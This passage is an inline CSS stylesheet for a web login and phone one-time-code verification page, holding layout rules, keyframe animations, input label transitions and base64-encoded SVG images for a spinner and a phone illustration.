iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PCEtLSBSb3RhdGlvbiBvZiB0aGUgYXJjIC0tPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhNSIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjAgMjUgMjUiIGR1cj0iNjI1bXMiIGJlZ2luPSIwOyBhOC5lbmQiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhNiIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjE4MCAyNSAyNSIgZHVyPSI2MjVtcyIgYmVnaW49ImE1LmVuZCIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGVUcmFuc2Zvcm0gaWQ9ImE3IiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBmcm9tPSIxODAgMjUgMjUiIHRvPSIxODAgMjUgMjUiIGR1cj0iNjI1bXMiIGJlZ2luPSJhNi5lbmQiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhOCIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMTgwIDI1IDI1IiB0bz0iMzYwIDI1IDI1IiBkdXI9IjYyNW1zIiBiZWdpbj0iYTcuZW5kIiBjYWxjTW9kZT0ic3BsaW5lIiBrZXlUaW1lcz0iMDsxIiBrZXlTcGxpbmVzPSIwLjIxNSwgMC42MSwgMC4zNTUsIDEiLz48IS0tIE9wYWNpdHkgY2hhbmdlIC0tPjxhbmltYXRlIGlkPSJhOSIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJvcGFjaXR5IiBmcm9tPSIwLjciIHRvPSIxIiBkdXI9IjYyNW1zIiBiZWdpbj0iMHM7IGExMC5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImExMCIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJvcGFjaXR5IiBmcm9tPSIxIiB0bz0iMC43IiBkdXI9IjYyNW1zIiBiZWdpbj0iYTkuZW5kIiBmaWxsPSJmcmVlemUiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjwvcGF0aD48YW5pbWF0ZVRyYW5zZm9ybSBpZD0iYTgiIGF0dHJpYnV0ZVR5cGU9IlhNTCIgYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMjUgMjUiIHRvPSIzNjAgMjUgMjUiIGR1cj0iNjYyNW1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPjwvZz48L3N2Zz4=)no-repeat 0 0;
      background-size: 100%;
      width: 40px;
      height: 40px;
      position: absolute;
      top: 5%;
      right: 5%
    }

    .puree-spinner-button {
      position: relative
    }

    html,
    input {
      font-family: "Helvetica Neue", Helvetica, Arial
    }

    html {
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale
    }

    html.grid {
      font-size: 18px
    }

    body {
      font-size: 16px;
      font-family: "Helvetica Neue", Helvetica, Arial
    }

    html,
    body {
      direction: ltr;
      -webkit-tap-highlight-color: transparent
    }

    .txt-align-right {
      text-align: right
    }

    .txt-align-center {
      text-align: center
    }

    body {
      min-width: 0 !important
    }

    html,
    body {
      height: 100%
    }

    @media only screen and (device-width:414px) and (device-height:896px) and (min-height:759px) and (-webkit-min-device-pixel-ratio:2),
    only screen and (device-width:375px) and (device-height:812px) and (min-height:675px) and (-webkit-device-pixel-ratio:3) {
      html {
        padding-bottom: 34px;
        box-sizing: border-box
      }

      body {
        position: relative
      }
    }

    .ltr {
      direction: ltr;
      unicode-bidi: embed
    }

    ::-webkit-scrollbar {
      -webkit-appearance: none
    }

    ::-webkit-scrollbar-thumb {
      background-color: rgba(0, 0, 0, .5);
      border-radius: 10px
    }

    ::-webkit-scrollbar-track {
      border-radius: 10px;
      background-color: rgba(0, 0, 0, .1)
    }

    @keyframes pending {

      0%,
      to {
        box-shadow: 0 15px 0 0#ececec
      }

      80% {
        box-shadow: 0 15px 0 0#e4e4e4
      }

      40% {
        box-shadow: 0 15px 0 0#d4d4d4
      }
    }

    @keyframes slideInLeft {
      0% {
        transform: translate(100%, 0)
      }

      to {
        transform: translate(0, 0)
      }
    }

    @keyframes slideInUp {
      0% {
        transform: translate(0, 60%);
        opacity: 0
      }

      to {
        transform: translate(0, 0);
        opacity: 1
      }
    }

    @keyframes slideInUpShort {
      0% {
        opacity: 0
      }

      37% {
        transform: translate(0, 80%);
        opacity: 0
      }

      to {
        transform: translate(0, 0);
        opacity: 1
      }
    }

    @keyframes zoomOut {
      0% {
        opacity: 1
      }

      50% {
        opacity: 0;
        transform: scale(.3, .3)
      }

      to {
        opacity: 0
      }
    }

    @keyframes blockHighlight {
      0% {
        background-color: #e9f5ff
      }

      20% {
        background-color: #e9f5ff
      }

      to {
        background-color: #fff
      }
    }

    @keyframes fadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: 1
      }
    }

    @keyframes fadeOut {
      0% {
        opacity: 1
      }

      to {
        opacity: 0
      }
    }

    @keyframes textHighlight {
      0% {
        color: #00cd7a
      }

      20% {
        color: #00cd7a
      }

      to {
        color: #262626
      }
    }

    @keyframes slideOutLeft {
      0% {
        transform: translateX(0)
      }

      to {
        transform: translateX(-800px)
      }
    }

    @keyframes slideInBottom {
      0% {
        transform: translateY(20px)
      }

      to {
        transform: translateY(0)
      }
    }

    .challenge-header {
      display: inline-block;
      width: 100%
    }

    .challenge-header .yid {
      overflow: hidden;
      text-overflow: ellipsis;
      font-size: .82353rem;
      letter-spacing: .58px;
      text-align: center
    }

    .grid .challenge-header {
      margin-top: .94118rem;
      min-height: 1rem
    }

    @keyframes dotframes {
      0% {
        transform: scale(1, 1)
      }

      5% {
        transform: scale(1.5, 1.5)
      }

      10% {
        transform: scale(2, 2)
      }

      15% {
        transform: scale(1.5, 1.5)
      }

      20% {
        transform: scale(1, 1)
      }

      to {
        transform: scale(1, 1)
      }
    }

    @keyframes slideLeft {
      0% {
        left: 120px
      }

      to {
        left: 0
      }
    }

    .challenge {
      margin: 0 auto;
      max-width: 18.82353rem
    }

    .grid .challenge {
      padding: 0 1.41176rem
    }

    .challenge .challenge-heading {
      display: block;
      margin: 0;
      margin-top: .82353rem;
      font-size: 1.17647rem;
      font-weight: 600;
      letter-spacing: -.2px;
      text-align: center;
      line-height: 1.35294rem
    }

    .challenge .challenge-desc {
      display: block;
      padding: 0;
      margin-top: .35294rem;
      font-size: .82353rem;
      letter-spacing: -.3px;
      line-height: 1rem;
      text-align: center
    }

    .challenge .challenge-sub-desc {
      display: block;
      margin-top: .88235rem;
      font-size: .82353rem;
      font-weight: 500
    }

    .challenge .challenge-img {
      margin: .82353rem auto;
      margin-bottom: 0;
      height: 3.17647rem;
      display: block;
      max-width: 100%
    }

    .challenge .challenge-form {
      margin: 0;
      margin-top: 2.35294rem
    }

    .challenge .button-container {
      font-size: .82353rem;
      margin-top: 1.41176rem;
      padding: 0
    }

    .challenge .challenge-resend-container {
      margin-top: 1.05882rem;
      text-align: center
    }

    .challenge .bottom-cta {
      display: block;
      left: 0;
      right: 0;
      bottom: 0;
      box-sizing: border-box;
      padding: 0 10px;
      margin: 0 auto;
      font-size: .82353rem;
      line-height: 1rem;
      text-align: center
    }

    .challenge .bottom-sticky {
      position: -webkit-sticky;
      position: sticky;
      margin-bottom: 0;
      padding-top: .70588rem;
      margin-top: .47059rem;
      padding-bottom: 24px;
      background-color: #fff;
      max-width: none
    }

    .challenge .challenge-button {
      font-size: .94118rem;
      font-weight: 500;
      min-height: 2.35294rem;
      padding: .64706rem 0;
      line-height: 1rem
    }

    .challenge .challenge-button-link {
      margin: 0;
      padding: 0;
      font-size: .82353rem;
      line-height: 1rem;
      white-space: normal
    }

    .challenge input::-webkit-caps-lock-indicator {
      visibility: hidden
    }

    .challenge input::-webkit-input-placeholder {
      letter-spacing: -.1px
    }

    .challenge .input-group {
      position: relative;
      margin-top: 1.29412rem
    }

    .challenge .input-group input[type=tel] {
      padding-left: 0;
      margin: 0;
      margin-top: .41176rem;
      height: 1.88235rem;
      font-size: .82353rem
    }

    .challenge .input-group input[name=code] {
      letter-spacing: .47059rem;
      text-transform: uppercase;
      display: inline-block
    }

    .generic-page .input-group input[type=text]:focus,
    .generic-page .input-group input[type=email]:focus,
    .generic-page .input-group input[type=tel]:focus,
    .generic-page .input-group input[type=password]:focus,
    .challenge .input-group input[type=text]:focus,
    .challenge .input-group input[type=email]:focus,
    .challenge .input-group input[type=tel]:focus,
    .challenge .input-group input[type=password]:focus {
      outline: 0
    }

    .challenge .input-group label {
      color: #999;
      font-size: .82353rem;
      letter-spacing: -.1px;
      font-weight: 400;
      position: absolute;
      pointer-events: none;
      left: 0;
      top: .70588rem;
      transition: .2s ease all;
      margin-top: 0;
      text-overflow: ellipsis;
      white-space: nowrap;
      overflow: hidden;
      max-width: 100%
    }

    .generic-page .input-group input[type=text]::-moz-placeholder,
    .generic-page .input-group input[type=email]::-moz-placeholder,
    .generic-page .input-group input[type=tel]::-moz-placeholder,
    .challenge .input-group input[type=password]::-moz-placeholder,
    .challenge .input-group input[type=text]::-moz-placeholder,
    .challenge .input-group input[type=email]::-moz-placeholder,
    .challenge .input-group input[type=tel]::-moz-placeholder {
      opacity: 0
    }

    .generic-page .input-group input[type=text]::placeholder,
    .generic-page .input-group input[type=email]::placeholder,
    .generic-page .input-group input[type=tel]::placeholder,
    .challenge .input-group input[type=password]::placeholder,
    .challenge .input-group input[type=text]::placeholder,
    .challenge .input-group input[type=email]::placeholder,
    .challenge .input-group input[type=tel]::placeholder {
      opacity: 0
    }

    .generic-page .input-group input[type=text]:focus::-moz-placeholder,
    .generic-page .input-group input[type=email]:focus::-moz-placeholder,
    .generic-page .input-group input[type=tel]:focus::-moz-placeholder,
    .challenge .input-group input[type=password]:focus::-moz-placeholder,
    .challenge .input-group input[type=text]:focus::-moz-placeholder,
    .challenge .input-group input[type=email]:focus::-moz-placeholder,
    .challenge .input-group input[type=tel]:focus::-moz-placeholder {
      opacity: 1;
      letter-spacing: .47059rem
    }

    .generic-page .input-group input[type=text]:focus::placeholder,
    .generic-page .input-group input[type=email]:focus::placeholder,
    .generic-page .input-group input[type=tel]:focus::placeholder,
    .challenge .input-group input[type=password]:focus::placeholder,
    .challenge .input-group input[type=text]:focus::placeholder,
    .challenge .input-group input[type=email]:focus::placeholder,
    .challenge .input-group input[type=tel]:focus::placeholder {
      opacity: 1;
      letter-spacing: .47059rem
    }

    .generic-page .input-group input[name=code]:focus::-moz-placeholder,
    .challenge .input-group input[name=code]:focus::-moz-placeholder {
      font-weight: 500;
      letter-spacing: .11765rem;
      transform: scaleX(2.5);
      transform-origin: left;
      color: #b9bdc5
    }

    .generic-page .input-group input[name=code]:focus::placeholder,
    .challenge .input-group input[name=code]:focus::placeholder {
      font-weight: 500;
      letter-spacing: .11765rem;
      transform: scaleX(2.5);
      transform-origin: left;
      color: #b9bdc5
    }

    .generic-page .input-group input[type=text]:focus~label,
    .generic-page .input-group input[type=email]:focus~label,
    .generic-page .input-group input[type=tel]:focus~label,
    .generic-page .input-group input[type=password]:focus~label,
    .generic-page .input-group input[type=text]:not(:placeholder-shown)~label,
    .generic-page .input-group input[type=email]:not(:placeholder-shown)~label,
    .generic-page .input-group input[type=tel]:not(:placeholder-shown)~label,
    .generic-page .input-group input[type=password]:not(:placeholder-shown)~label,
    .generic-page .input-group .used~label,
    .challenge .input-group input[type=text]:focus~label,
    .challenge .input-group input[type=email]:focus~label,
    .challenge .input-group input[type=tel]:focus~label,
    .challenge .input-group input[type=password]:focus~label,
    .challenge .input-group input[type=text]:not(:placeholder-shown)~label,
    .challenge .input-group input[type=email]:not(:placeholder-shown)~label,
    .challenge .input-group input[type=tel]:not(:placeholder-shown)~label,
    .challenge .input-group input[type=password]:not(:placeholder-shown)~label,
    .challenge .input-group .partitioned-inputs:focus-within~label,
    .challenge .input-group .used~label {
      top: -.47059rem;
      font-size: .70588rem;
      letter-spacing: -.1px;
      color: #262626
    }

    .generic-page .input-group input[type=text]:not(.validation),
    .generic-page .input-group input[type=tel]:not(.validation),
    .generic-page .input-group input[type=email]:not(.validation),
    .challenge .input-group input[type=text]:not(.validation),
    .challenge .input-group input[type=email]:not(.validation),
    .challenge .input-group input[type=tel]:not(.validation) {
      border: 0;
      border-bottom: .05882rem solid #b9bdc5
    }

    .challenge .input-group input[type=text]:focus,
    .challenge .input-group input[type=email]:focus,
    .challenge .input-group input[type=tel]:focus {
      border: 0;
      border-bottom: .05882rem solid #1476d9
    }

    @keyframes open-suggestion-transition {
      0% {
        max-height: 0;
        opacity: 0;
        visibility: hidden
      }

      50% {
        visibility: visible;
        opacity: 0
      }

      to {
        opacity: 1;
        max-height: 1000px
      }
    }

    @keyframes close-suggestion-transition {
      0% {
        max-height: 1000px;
        opacity: 1;
        visibility: visible
      }

      to {
        max-height: 0;
        opacity: 0;
        visibility: hidden
      }
    }

    @keyframes pending {

      0%,
      to {
        box-shadow: 0 15px 0 0#ececec
      }

      80% {
        box-shadow: 0 15px 0 0#e4e4e4
      }

      40% {
        box-shadow: 0 15px 0 0#d4d4d4
      }
    }

    .loginish {
      min-height: 100%;
      background-color: #fff;
      color: #26282a
    }

    .loginish input[type=tel] {
      color: #26282a
    }

    .login-box-container {
      margin: 0 auto;
      max-width: 1030px;
      min-width: 320px;
      position: relative
    }

    .login-box,
    .login-box-ad-fallback {
      position: absolute;
      top: 11px
    }

    .login-box {
      box-sizing: border-box;
      background-color: #fff;
      color: #26282a;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3);
      width: 360px;
      right: 0;
      min-height: 550px;
      z-index: 1;
      padding: 28px 5px;
      padding-bottom: 10px;
      border: 1px solid transparent;
      border-top: 1px solid #f1f1f5
    }

    .grid .login-box {
      padding-top: 0
    }

    .login-box-ad-fallback {
      left: 0;
      padding: 50px 380px 50px 50px;
      font-size: 21px
    }

    .login-box-ad-fallback h1 {
      font-size: 21px;
      font-weight: 700;
      padding: 20px 0;
      text-transform: none
    }

    .login-bg-outer {
      height: 100%;
      width: 100%;
      overflow: hidden;
      min-height: 580px;
      text-align: center;
      position: relative;
      z-index: 0;
      top: 0
    }

    .login-bg-inner {
      margin: 0-800px
    }

    @media screen and (max-width:1040px) {
      .login-box {
        right: 10px
      }

      .login-box-ad-fallback {
        padding: 50px 380px 50px 10px
      }
    }

    @media screen and (max-width:480px) {
      .login-box {
        right: 0;
        left: 0;
        margin: 0 auto
      }

      .login-box-ad-fallback {
        display: none
      }
    }

    @media screen and (max-width:359px) {
      .login-box {
        width: 320px;
        padding: 0
      }
    }

    .responsive .login-box-ad-fallback {
      display: block
    }

    @media screen and (max-width:640px) {
      .responsive .login-box-ad-fallback {
        display: none
      }

      .responsive .login-box {
        position: relative;
        margin: 0 auto;
        right: auto
      }

      .responsive .login-bg-outer {
        display: none
      }
    }

    @media screen and (max-width:480px) {
      .responsive .login-box {
        box-shadow: none;
        border-top: 0;
        width: 100%;
        min-height: auto
      }

      .responsive .login-box .challenge .bottom-cta {
        position: relative
      }
    }

    @keyframes bounce {
      0% {
        transform: translateX(0)
      }

      50% {
        transform: translateX(4px)
      }

      to {
        transform: translateX(0)
      }
    }

    #phone-verify-challenge .phone-otp-image {
      background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTYwcHgiIGhlaWdodD0iMTA0cHgiIHZpZXdCb3g9IjAgMCAxNjAgMTA0IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+UGhvbmUgT1RQX0luaXRpYXRlIElMIG9ubHk8L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZGVmcz4KICAgICAgICA8cmVjdCBpZD0icGF0aC0xIiB4PSIwIiB5PSIwIiB3aWR0aD0iNjEuMDc4MTI5NyIgaGVpZ2h0PSIxMDAuNjkxOTM5IiByeD0iMy44NTQ4NzI5MSI+PC9yZWN0PgogICAgICAgIDxmaWx0ZXIgeD0iLTEzLjklIiB5PSItNi41JSIgd2lkdGg9IjEyNy44JSIgaGVpZ2h0PSIxMTYuOSUiIGZpbHRlclVuaXRzPSJvYmplY3RCb3VuZGluZ0JveCIgaWQ9ImZpbHRlci0yIj4KICAgICAgICAgICAgPGZlT2Zmc2V0IGR4PSIwIiBkeT0iMiIgaW49IlNvdXJjZUFscGhhIiByZXN1bHQ9InNoYWRvd09mZnNldE91dGVyMSI+PC9mZU9mZnNldD4KICAgICAgICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMi41IiBpbj0ic2hhZG93T2Zmc2V0T3V0ZXIxIiByZXN1bHQ9InNoYWRvd0JsdXJPdXRlcjEiPjwvZmVHYXVzc2lhbkJsdXI+CiAgICAgICAgICAgIDxmZUNvbG9yTWF0cml4IHZhbHVlcz0iMCAwIDAgMCAwICAgMCAwIDAgMCAwICAgMCAwIDAgMCAwICAwIDAgMCAwLjE2MTc2OTcwMSAwIiB0eXBlPSJtYXRyaXgiIGluPSJzaGFkb3dCbHVyT3V0ZXIxIj48L2ZlQ29sb3JNYXRyaXg+CiAgICAgICAgPC9maWx0ZXI+CiAgICAgICAgPHJlY3QgaWQ9InBhdGgtMyIgeD0iNC4yNCIgeT0iNy45NzU1OTkxMyIgd2lkdGg9IjUyLjY1MzU2MDEiIGhlaWdodD0iNzguMTcxNTgzNyIgcng9IjEuNzk0NTA5OCI+PC9yZWN0PgogICAgICAgIDxmaWx0ZXIgeD0iLTIwLjMlIiB5PSItNDYuMiUiIHdpZHRoPSIxNDAuNyUiIGhlaWdodD0iMTkyLjUlIiBmaWx0ZXJVbml0cz0ib2JqZWN0Qm91bmRpbmdCb3giIGlkPSJmaWx0ZXItNSI+CiAgICAgICAgICAgIDxmZU9mZnNldCBkeD0iMCIgZHk9IjIiIGluPSJTb3VyY2VBbHBoYSIgcmVzdWx0PSJzaGFkb3dPZmZzZXRPdXRlcjEiPjwvZmVPZmZzZXQ+CiAgICAgICAgICAgIDxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjIuNSIgaW49InNoYWRvd09mZnNldE91dGVyMSIgcmVzdWx0PSJzaGFkb3dCbHVyT3V0ZXIxIj48L2ZlR2F1c3NpYW5CbHVyPgogICAgICAgICAgICA8ZmVDb2xvck1hdHJpeCB2YWx1ZXM9IjAgMCAwIDAgMCAgIDAgMCAwIDAgMCAgIDAgMCAwIDAgMCAgMCAwIDAgMC4xNSAwIiB0eXBlPSJtYXRyaXgiIGluPSJzaGFkb3dCbHVyT3V0ZXIxIiByZXN1bHQ9InNoYWRvd01hdHJpeE91dGVyMSI+PC9mZUNvbG9yTWF0cml4PgogICAgICAgICAgICA8ZmVNZXJnZT4KICAgICAgICAgICAgICAgIDxmZU1lcmdlTm9kZSBpbj0ic2hhZG93TWF0cml4T3V0ZXIxIj48L2ZlTWVyZ2VOb2RlPgogICAgICAgICAgICAgICAgPGZlTWVyZ2VOb2RlIGluPSJTb3VyY2VHcmFwaGljIj48L2ZlTWVyZ2VOb2RlPgogICAgICAgICAgICA8L2ZlTWVyZ2U+CiAgICAgICAgPC9maWx0ZXI+CiAgICAgICAgPGxpbmVhckdyYWRpZW50IHgxPSIxMDAlIiB4Mj0iMCUiIHkyPSIxMDAlIiBpZD0ibGluZWFyR3JhZGllbnQtNiI+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiMxNDc2RDkiIG9mZnNldD0iMCI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjNUNBREZGIiBvZmZzZXQ9IjEiPjwvc3RvcD4KICAgICAgICA8L2xpbmVhckdyYWRpZW50PgogICAgPC9kZWZzPgogICAgPGcgaWQ9IlBob25lLU9UUF9Jbml0aWF0ZS1JTC1vbmx5IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8cGF0aCBkPSJNMTI3LjkwMDcyNCw4OS44MzYzODkzIEMxMzEuNjA1MTY4LDkzLjU5NzIxIDEzMi44NTM3NjEsOTMuNjAzMzYxOSAxMzYuNjM3Mjg1LDg5Ljg3NTE0MTUgQzEzMi44NTM3NjEsOTMuNjAzMzYxOSAxMzIuODQxMTc2LDk0Ljg1MzQ1NDkgMTM2LjU0NDE5Myw5OC42MDk5NTcxIEMxMzIuODQxMTc2LDk0Ljg1MzQ1NDkgMTMxLjU5MDQzLDk0Ljg0NDQyNzcgMTI3LjgwOTA2MSw5OC41NzQ4MDI4IEMxMzEuNTkwNDMzLDk0Ljg0MzcwNzIgMTMxLjYwNTE2OCw5My41OTcyMSAxMjcuOTAwNzI0LDg5LjgzNjM4OTMgWiIgaWQ9IlBhdGgtQ29weS0xNiIgZmlsbD0iI0RGRTJFOCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTMyLjIyMzE3MywgOTQuMjIzMTczKSByb3RhdGUoLTMxNS4wMDAwMDApIHRyYW5zbGF0ZSgtMTMyLjIyMzE3MywgLTk0LjIyMzE3MykgIj48L3BhdGg+CiAgICAgICAgPHBhdGggZD0iTTE0My41LDU0IEwxNDAsNTUuMzMwMzQ4MyBMMTQwLDU3LjEwNDE0NTkgQzE0MC4wMDEyOTYsNTkuMzU3Njk0NSAxNDEuNDAzNTgxLDYxLjM2NTgxMDMgMTQzLjUsNjIuMTE2MjU1MSBDMTQ1LjU5NjQxOSw2MS4zNjU4MTAzIDE0Ni45OTg3MDQsNTkuMzU3Njk0NSAxNDcsNTcuMTA0MTQ1OSBMMTQ3LDU1LjMzMDM0ODMgTDE0My41LDU0IFoiIGlkPSJQYXRoLUNvcHktNiIgc3Ryb2tlPSIjREZFMkU4IiBzdHJva2Utd2lkdGg9IjEuMTU1NTU1NTYiPjwvcGF0aD4KICAgICAgICA8cGF0aCBkPSJNMTMzLjg0MjIzNiwxMSBMMTMxLDEyLjA4MDMzMjUgTDEzMSwxMy41MjA3NzU4IEMxMzEuMDAxMDUzLDE1LjM1MDgwOTIgMTMyLjEzOTgwMywxNi45ODE1MzQ3IDEzMy44NDIyMzYsMTcuNTkwOTQ2NSBDMTM1LjU0NDY2OSwxNi45ODE1MzQ3IDEzNi42ODM0MTksMTUuMzUwODA5MiAxMzYuNjg0NDcyLDEzLjUyMDc3NTggTDEzNi42ODQ0NzIsMTIuMDgwMzMyNSBMMTMzLjg0MjIzNiwxMSBaIiBpZD0iUGF0aC1Db3B5LTkiIHN0cm9rZT0iI0RGRTJFOCIgc3Ryb2tlLXdpZHRoPSIxLjE1NTU1NTU2Ij48L3BhdGg+CiAgICAgICAgPHBhdGggZD0iTTE3Ljg0MjIzNiw0MiBMMTUsNDMuMDgwMzMyNSBMMTUsNDQuNTIwNzc1OCBDMTUuMDAxMDUyOCw0Ni4zNTA4MDkyIDE2LjEzOTgwMjcsNDcuOTgxNTM0NyAxNy44NDIyMzYsNDguNTkwOTQ2NSBDMTkuNTQ0NjY5Myw0Ny45ODE1MzQ3IDIwLjY4MzQxOTMsNDYuMzUwODA5MiAyMC42ODQ0NzIsNDQuNTIwNzc1OCBMMjAuNjg0NDcyLDQzLjA4MDMzMjUgTDE3Ljg0MjIzNiw0MiBaIiBpZD0iUGF0aC1Db3B5LTEwIiBzdHJva2U9IiNERkUyRTgiIHN0cm9rZS13aWR0aD0iMS4xNTU1NTU1NiI+PC9wYXRoPgogICAgICAgIDxwYXRoIGQ9Ik0xMTguNDg0NjUyLDIxLjAyNjg5MTQgTDExOS4yMzI3NjYsMjEuMDI2ODkxNCBDMTE5Ljg2NjA3NiwyMS4wMjY4OTE0IDEyMC4zNzk0NzYsMjEuNTQxNzUxNiAxMjAuMzc5NDc2LDIxLjk2ODQ1NTEgTDEyMC4zNzk0NzYsMjEuMDI2ODkxNCBDMTIwLjM3OTQ3NiwyMS41NDY5MDI3IDExOS44NTQ0MjgsMjEuOTY4NDU1MSAxMTkuMjMyNzY2LDIxLjk2ODQ1NTEgTDExOC40ODQ2NTIsMjEuOTY4NDU1MSBMMTE4LjQ4NDY1MiwyMy4zODI5Njc2IEMxMTguNDg0NjUyLDIzLjY0MTc3NjYgMTE4LjI2NDkxNSwyMy44NTE1ODI3IDExOC4wMTA5NDYsMjMuODUxNTgyNyBDMTE3Ljc0OTMyNSwyMy44NTE1ODI3IDExNy41MzcyNCwyMy42NDkyOTM2IDExNy41MzcyNCwyMy4zODI5Njc2IEwxMTcuNTM3MjQsMjEuOTY4NDU1MSBMMTE2Ljc4OTEyNiwyMS45Njg0NTUxIEMxMTYuMTU1ODE1LDIxLjk2ODQ1NTEgMTE1LjY0MjQxNiwyMS40NTM1OTQ5IDExNS42NDI0MTYsMjEuMDI2ODkxNCBMMTE1LjY0MjQxNiwyMS45Njg0NTUxIEMxMTUuNjQyNDE2LDIxLjQ0ODQ0MzggMTE2LjE2NzQ2MywyMS4wMjY4OTE0IDExNi43ODkxMjYsMjEuMDI2ODkxNCBMMTE3LjUzNzI0LDIxLjAyNjg5MTQgTDExNy41MzcyNCwxOS42MTIzNzg5IEMxMTcuNTM3MjQsMTkuMzUzNTY5OSAxMTcuNzU2OTc2LDE5LjE0Mzc2MzggMTE4LjAxMDk0NiwxOS4xNDM3NjM4IEMxMTguMjcyNTY2LDE5LjE0Mzc2MzggMTE4LjQ4NDY1MiwxOS4zNDYwNTI5IDExOC40ODQ2NTIsMTkuNjEyMzc4OSBMMTE4LjQ4NDY1MiwyMS4wMjY4OTE0IFoiIGlkPSJDb21iaW5lZC1TaGFwZS1Db3B5LTkiIGZpbGw9IiNERkUyRTgiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDExOC4wMTA5NDYsIDIxLjQ5NzY3Mykgcm90YXRlKDM5LjAwMDAwMCkgdHJhbnNsYXRlKC0xMTguMDEwOTQ2LCAtMjEuNDk3NjczKSAiPjwvcGF0aD4KICAgICAgICA8Y2lyY2xlIGlkPSJPdmFsLTItQ29weS00IiBzdHJva2U9IiNFMEU0RTkiIHN0cm9rZS13aWR0aD0iMS4xNTU1NTU1NiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQ4LjAxODc0OSwgMzQuMDE4NzQ5KSBzY2FsZSgtMSwgMSkgcm90YXRlKC0zNy4wMDAwMDApIHRyYW5zbGF0ZSgtMTQ4LjAxODc0OSwgLTM0LjAxODc0OSkgIiBjeD0iMTQ4LjAxODc0OSIgY3k9IjM0LjAxODc0ODgiIHI9IjIuNzMzMzMzMjgiPjwvY2lyY2xlPgogICAgICAgIDxjaXJjbGUgaWQ9Ik92YWwtMi1Db3B5LTUiIHN0cm9rZT0iI0UwRTRFOSIgc3Ryb2tlLXdpZHRoPSIxLjE1NTU1NTU2IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyMS4yNDA1MjEsIDIzLjUyOTQxMCkgc2NhbGUoLTEsIDEpIHJvdGF0ZSgtMzcuMDAwMDAwKSB0cmFuc2xhdGUoLTIxLjI0MDUyMSwgLTIzLjUyOTQxMCkgIiBjeD0iMjEuMjQwNTIwNiIgY3k9IjIzLjUyOTQwOTUiIHI9IjEuNzMzMzMzMzMiPjwvY2lyY2xlPgogICAgICAgIDxnIGlkPSJwaG9uZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNDkuMDAwMDAwLCAxLjAwMDAwMCkiPgogICAgICAgICAgICA8ZyBpZD0ic2NyZWVucyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC42NjY2NjcsIDAuMDAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0icGhvbmUtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgPHVzZSBmaWxsPSJibGFjayIgZmlsbC1vcGFjaXR5PSIxIiBmaWx0ZXI9InVybCgjZmlsdGVyLTIpIiB4bGluazpocmVmPSIjcGF